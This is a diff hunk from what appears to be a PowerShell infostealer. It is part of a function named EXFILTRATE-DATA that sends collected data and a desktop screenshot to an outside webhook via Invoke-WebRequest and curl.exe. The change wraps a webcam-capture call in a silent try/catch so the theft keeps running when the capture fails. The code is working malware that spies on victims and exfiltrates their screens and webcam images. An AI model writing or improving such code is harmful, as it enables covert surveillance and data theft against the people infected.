@@ -330,7 +330,8 @@ function EXFILTRATE-DATA {
     $payload = $embed_and_body | ConvertTo-Json -Depth 10
     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
 
-    Get-WebCamImage
+    #somtimes this doesn't work for people so I'm going to try catch the entire thing
+    try {Get-WebCamImage} catch {}
 
     curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$folder_general\desktop-screenshot.png\`"" $webhook | out-null
 
